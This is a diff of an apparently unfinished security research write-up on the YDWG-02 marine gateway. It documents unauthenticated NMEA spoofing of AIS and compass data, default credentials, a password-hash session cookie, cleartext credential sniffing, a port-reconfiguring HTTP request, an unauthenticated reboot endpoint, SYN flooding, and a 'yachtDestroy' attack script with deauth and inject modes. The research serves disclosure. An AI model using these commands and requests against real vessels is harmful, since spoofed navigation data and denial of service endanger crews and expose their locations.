@@ -165,7 +165,7 @@ PORT      STATE    SERVICE
 MAC Address: 4C:EB:D6:86:BA:CC (Espressif)
 ```
 
-As an attacker, we could identify the two ports mentioned on the documentation (1456 is default NMEA 0183), and ncat to the device to see if we can get any data out of it:
+As an attacker, we could identify the two ports mentioned on the documentation (1456 is default NMEA 0183 TX), and ncat to the device to see if we can get any data out of it:
 
 ```
 ncat.exe 192.168.10.71 1456
@@ -179,7 +179,7 @@ $PCDIN,01F211,003A2370,6F,00475D64070000FF*56
 $MXPGN,01F211,686F,00475D64070000FF*1C
 ```
 
-Suprise! We can also send data to this port, since they mentioned in the documentation that the device can work bidirectionally (by default). 
+If the user has set this port as bidirectional (TX/RX), we can even send data to the device, and after it receives the data, it will send it out on the N2K bus. 
 
 ## 2. Exploitation
 
@@ -188,13 +188,14 @@ Suprise! We can also send data to this port, since they mentioned in the documen
 > As mentioned in chapter `IV. Configuration of Application Protocols` the YDGW-02 "With the factory settings, Gateway has the Server #1 enabled and pre-configured to
 use TCP port 1456 and the NMEA 0183 data protocol.."
 
-This means by default we gain access to unencrypted NMEA 0183, which contains things like positioning, gps data, navigation info, wind and weather, heading and compass, and AIS target info.
+This means by default we gain access to **unencrypted** NMEA 0183 data that can be exfiltrated. This data can contain things like positioning, gps data, navigation info, wind and weather, heading and compass, and AIS target info. However, it's not completely insecure by default. You cannot send data to the device, unless the user has set the device to bidirectional communication. Still this is very likely, as the documentation states, `"Note that Gateway server port must be configured to work in both directions («Transmit
+Only» in factory settings) to allow control of autopilot from the application."`. 
 
-If any other servers are turned on, data can be sent or received, based on the configuration by the user.
+If any other servers are turned on, data can be sent or received, **completely unauthenticated**, based on the configuration by the user.
 
-An example of what was used to send data to the device can be seen in the [test-nmea0183spoofer-default.sh](./assets/software/test-nmea0183spoofer-default.sh) file. The device converts the messages to NMEA 2000, and sends them out on the CAN bus, as seen in the [test-nmea0183spoofer-default.sh-results.txt](./assets/software/test-nmea0183spoofer-default.sh-results.txt) file. You can see that the source address stays the same (0x43).
+An example of what was used to send data to the device can be seen in the [test-nmea0183spoofer.sh](./assets/software/test-nmea0183spoofer.sh) file. The device converts the messages to NMEA 2000, and sends them out on the CAN bus, as seen in the [test-nmea0183spoofer.sh-results.txt](./assets/software/logs/test-nmea0183spoofer.sh-results.txt) file. You can see that the source address stays the same (0x43) but is still dynamically changed, and is currently considered undeterministic.
 
-Another script is also used to extensively test the default TCP port on 1456, and it is called [nmea0183-demo.sh](./assets/software/nmea0183-demo.sh). A converted output of the candump log can be seen in the [canboat-output-0183.txt](./assets/software/logs/canboat-output-0183.txt) file. If you have physical access to the N2K bus, it can be seen that the YDWG-02 also allows for sending AIS messages on the bus:
+Another script is also used to extensively test the TCP port on 1456, and it is called [nmea0183-demo.sh](./assets/software/nmea0183-demo.sh). A converted output of the candump log can be seen in the [canboat-output-0183.txt](./assets/software/logs/canboat-output-0183.txt) file.
 
 ```
 1970-01-01-00:00:20.347 4  67 255 129038 AIS Class A Position Report:  Message ID = Scheduled Class A position report; Repeat Indicator = Initial; User ID = "244698076"; Longitude = 19.9172333; Latitude = 51.2296366; Position Accuracy = High; RAIM = not in use; Time Stamp = 48; COG = 110.7 deg; SOG = 0.00 m/s; Communication State = 00 00 00; AIS Transceiver information = Channel A VDL reception; Heading = Unknown; Rate of Turn = 0.000 deg/s; Nav Status = Under way using engine; Special Maneuver Indicator = Not available; Sequence ID = Unknown
@@ -202,19 +203,17 @@ Another script is also used to extensively test the default TCP port on 1456, an
 
 > Note: This was parsed using canboat's analyzer tool. 
 
-We just spoofed an AIS message from the default port (1456) on the YDWG, which is widely used in the maritime industry for tracking vessels, and is used by the US Coast Guard to track vessels in the area.
+![spoofing mfd](./assets/gifs/spoofing-mfd.gif)
+
+This video demonstrates the spoofing of messages to the MFD (Multi-Function Display) on the N2K bus, using our testing port 1456 on the YDWG-02. Thus we are able to remotely control the MFD from a device within the RSSI (Radio Signal Strength Indicator) of the YDWG-02.
+
+We just spoofed an AIS message from setting the port (1456) to bidirectional N2K / 0183 on the YDWG, which is widely used in the maritime industry for tracking vessels, and is used by the US Coast Guard to track vessels in the area.
 
 ## 2.2 NMEA 2000 Spoofing
 
-If the user also turns on bidirectional communication on the n2k bus. This means we can send any arbitrary message to the bus, given the source address of the YDWG-02 (0x43). 
+If the user also turns on bidirectional communication on the n2k bus. This means we can send any arbitrary message to the bus, given the source address of the YDWG-02. 
 
 As a reminder, these ports are **NOT encrypted, or authenticated in any form**. This means that any attacker with access to the network can send arbitrary messages to the bus, and potentially spoof the devices on the bus (which was proven from the [nmea2k-compass-spoofer.sh](./assets/software/nmea2k-compass-spoofer.sh) file).
-
-From there we can see some actual physical command and control of the devices on the bus:
-
-TODO: insert gif of spoofing the compass.
-
-TODO: insert gif of spoofing the gps?
 
 ### 2.3 Web Application Analysis
 
@@ -222,7 +221,7 @@ The web application is hosted on port 80 (unencrypted HTTP). More information ab
 
 #### 2.3.1 Burp Suite
 
-Some of the analsysis was done using the device as an AP, and some of the analysis was done using the device as a client. If the device is in AP mode, the device is technically more secure, but in client mode, if the device is connected to a public wifi network, it is **much more** vulnerable to attacks, as shown in the following sections.
+Some of the analysis was done using the device as an AP, and some of the analysis was done using the device as a client. If the device is in AP mode, the device is technically more secure, but in client mode, if the device is connected to a public wifi network, it is **much more** vulnerable to attacks, as shown in the following sections.
 
 #### 2.3.1.1 Authentication Bypass
 
@@ -269,7 +268,7 @@ function login(e){
 }
 ```
 
-This means that we could possibly brute force the credentials since there is no Web Application Firewall (WAF), and gain access to the device. As a reminder the default credentials are `admin:admin` in the web application.
+We could also possibly brute force the credentials, and gain access to the device. As a reminder the default credentials are `admin:admin` in the web application.
 
 #### 2.3.1.2 Sniffing Access Point Credentials
 
@@ -355,11 +354,11 @@ function changeWifiAp(e) {
 }
 ```
 
-This means that we can easily spin up wireshark, and capture the traffic in the public McDonald's wifi (given the device is setup in client mode), and see the credentials in cleartext.
+This means that we can easily spin up wireshark, and capture the traffic in the public McDonald's wifi (given the device is setup in client mode), and see the credentials in cleartext. This means the YDWG-02 essentially acts as the MiTM for us to sniff the credentials of other protected networks.
 
 #### Cloud Application
 
-The device can also be configured to send data to a cloud service, which is not encrypted, and can be intercepted by an attacker on the same network. The cloud service was not tested, and out of the scope for this project, but it is worth mentioning that, from the manufacturer's documentation, that a "secret" link can be created. This link is encrypted, but for example, as simple google search for `"site:cloud.yachtd.com/s/"` gives us access to secret links that expose locations of vessels, and other sensitive information.
+The device can also be configured to send data to a cloud service, which is thought to be unencrypted, and can be intercepted by an attacker on the same network. The cloud service was not tested, and out of the scope for this project, but it is worth mentioning that, from the manufacturer's documentation, that a "secret" link can be created. This link is encrypted, but for example, as simple google search for `"site:cloud.yachtd.com/s/"` gives us access to secret links that expose locations of vessels, and other sensitive information. This could be considered a violation of IDOR (Insecure Direct Object Reference), as the user can access other users' data, and potentially spoof their location.
 
 Nonetheless, the key that is used to for boats on the cloud service is also sent in cleartext, and can be intercepted by an attacker on the same network.
 
@@ -415,18 +414,22 @@ function setULSettings(e) {
 }
 ```
 
-### 2.3.2 OWASP ZAP
+The following could be used to exfiltrate data from a YDWG-02, or possibly inject data:
 
-#### 2.2.2.1 XSS Vulnerability
+```
+POST /nmea_settings/update?1=1&ns_enabled0=1&ns_type0=0&ns_protocol0=0&ns_port0=1456&ns_direction0=1&ns_enabled1=0&ns_type1=1&ns_protocol1=1&ns_port1=1457&ns_direction1=3&ns_enabled2=1&ns_type2=0&ns_protocol2=2&ns_port2=1458&ns_direction2=1 HTTP/1.1
+Host: 192.168.4.1
+Content-Length: 0
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://192.168.4.1
+Referer: http://192.168.4.1/servers.html
+Accept-Encoding: gzip, deflate, br
+Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
+Connection: keep-alive
 
-#### 2.2.2.2 Clickjacking Vulnerability
-
-#### 2.2.2.3 API Vulnerabilities
-
-| Endpoint | Description |
-|----------|-------------|
-| /flash/reboot | Reboot the device. This can be used to perform a denial of service attack on the device. |
-
+```
 
 ```
 GET /settings/logging HTTP/1.1
@@ -476,13 +479,59 @@ Content-Type: application/json
 { "version": "1.74", "sn": "00604470", "hardware": "1.00", "build": "43" }
 ```
 
-Talk about AIS spoofing future work.
+The [API vulnerabilities](#2223-api-vulnerabilities) section goes further into this.
 
-Try out cloud service.
+### 2.3.2 OWASP ZAP
+
+The OWASP ZAP tool was also used to scan the web application for vulnerabilities. The following vulnerabilities were found after performing [the scan](./assets/web/2025-05-02-ZAP-Report-.html):
+
+#### 2.2.2.1 XSS Vulnerability
+
+![Cross Site Scripting](./assets/imgs/xss.png)
+
+Which actually also performs as a sort of DoS attack, since the Javascript shown below, actually continually loops when the user is logging in from the /login.html page.
+
+```javascript
+function login(e){
+	e.preventDefault();
+    var url = "/login?1=1";
+
+    url += "&login=" + $("#login").value.trim().toLowerCase();
+    url += "&password=" + $("#password").value.trim();
+    var r = findGetParameter("r");    
+
+    var button = $("#login-button");
+    addClass(button, "pure-button-disabled");
+
+    ajaxReq("POST", url, function (resp) {
+        removeClass(button, "pure-button-disabled");
+        if(r !== null)
+        	window.location = r
+        else
+        	window.location = "/home.html"
+    }, function (s, st) {
+        showWarning("Invalid credentials");
+        removeClass(button, "pure-button-disabled");
+    });
+}
+```
+
+#### 2.2.2.2 Clickjacking Vulnerability
+
+![Clickjacking](./assets/imgs/clickjacked.png)
+
+This screenshot is simply [an iframe](assets/web/clickjacked.html).
+
+#### 2.2.2.3 API Vulnerabilities
+
+A copy of the APIs exposed, or at least most of them, are base64 encoded in an XML file [here](./assets/web/site-map).
+
+One noteable API, is the `/flash/reboot` endpoint, which allows us to reboot the device, and is not authenticated. This means that any attacker on the same network can reboot the device, and potentially cause a denial of service attack.
 
 ### Cookie Injection
 
-This seems to be the only cookie to exist: 
+The cookies used by the device are not signed, and are used to authenticate the user. This means that we can easily inject a cookie into the request, and gain access to the device. This is just another way we can bypass the authentication, given the use of hashcat to crack the SHA1 hashed password.
+
 ```
 Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997
 ```
@@ -508,16 +557,56 @@ Server: YDWG
 Connection: close
 Set-Cookie: session=D033E22AE348AEB5660FC2140AEC35850C4DA997; path=/; expires=Tue, 7 Apr 2038 12:25:11; 
 ```
+https://shattered.io/ --> this could be succeptible to a hash collision attack, since the cookie is not signed, and the device is using SHA1 (not secure in 2025).
+
+To prove the cookie is the password as a sha1 hash, we can use the following command:
+```bash
+ echo -n "admin" | sha1sum
+
+d033e22ae348aeb5660fc2140aec35850c4da997  -
+```
 
 ![cookie injection](./assets/imgs/cookie-injected-success.png)
 
 ![wireshark](./assets/imgs/wireshark.png)
 
-We can also literally see the password too!
+The password can be seen here as well. 
 
-TODO: test this on a device we don't own.. see if it persists across devices. We already know it persists across reboots, but does it persist across devices?
+## 2.4 TCP connection exaustion attacks (SYN flood)
 
-#
+Since the default port is left on as 1456 for NMEA 0183 and 80 for the HTTP, the effects of a TCP flood attack were also tested. The device was not able to effectively prevent either ports as shown below.
+
+![tcp syn flood](./assets/gifs/syn-flood-1456-0183.gif)
+
+> Note: the tcp syn flood of port 80 on the yacht device isn't shown because hping3 takes processing power, and it would be unfair to perform both simultaniously. It is still considered a vulnerability; however, as this could prevent yacht owners, regatta racers, etc., to access crucial data.
+
+## 2.5 Web Sockets
+
+Web seockets are enabled by default, and are considered unencrypted as well, and can be MiTM'd with a spoofed replay of the data:
+
+![image of mitm](./assets/imgs/websockets.png)
+
+## 2.5 Hashcat
+
+TODO: show hashcat cracking the password.
+
+# 3. Lateral Movement TODO
+
+To automate these processes, a script was created to check for the AP static IP address (192.168.4.1), or the user can manually enter the IP address of the device. If the device is in AP mode, it tries to connect to the AP with the default password (123456578), otherwise it performs a deuath and tries to crack the hash. Once the script has entered the same network as the device, it scans for ports. If port 80 is active, it tries to authenticate with the web application using the default credentials (admin:admin). If the default port 1456 is active, it sends messages shown in the nmea0183-demo.sh script. If any other ports are found open (given a use supplied range to check via nmap), the script then listens for valid NMEA 2K, or 0183 traffic (these can be bidirectionally set up; hence they are targeted). Then, if the default credentials do not work, it sets up a listner on the linux device to capture the traffic. If it detects passwords, or other key words, it will alert the user. 
+
+There are four modes of operation for the script:
+```bash
+./yachtDestroy --deauth
+./yachtDestroy --deny
+./yachtDestroy --inject
+./yachtDestroy --enumerate
+```
+
+It is recommend to run the deauth script first. 
+
+# 4. What makes this dangerous?
+
+TODO
 
 # FAQ
 
